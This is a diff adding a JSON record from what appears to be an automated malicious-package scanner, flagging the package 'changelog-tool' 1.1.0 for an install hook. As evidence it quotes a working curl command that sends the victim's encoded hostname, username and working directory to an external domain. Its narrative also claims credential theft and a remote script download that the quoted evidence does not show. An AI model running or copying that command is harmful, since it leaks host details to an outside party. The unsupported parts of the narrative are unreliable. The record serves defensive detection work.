@@ -1,0 +1,53 @@
+{
+  "package_name": "changelog-tool",
+  "version": "1.1.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains no JavaScript files but an install hook present. Payload may be remote.",
+        "details": "The package file structure contains an install hook present. This is likely an attack payload that executes at install time via the commands listed in the PACKAGEMETADATA above.",
+        "confidence": 0.72,
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": [],
+        "evidence_commands": [
+          "curl -H\"Package:changelog-tool\" -H\"Version:1.1.0\" -H\"Hostname:$(hostname|base64)\" -H\"Whoami:$(whoami|base64)\" -H\"Pwd:$(pwd|base64)\" -d\"meow!securitytest\" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads environment credentials, POSTs to external domain, install hook downloads remote script and executes it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package purpose is not clear, the behaviors do not seem to match the package purpose",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.5,
+      "explanation": "The detected behaviors form a coherent attack chain and they are not justified by the package's stated purpose"
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:06:49.271553"
+}
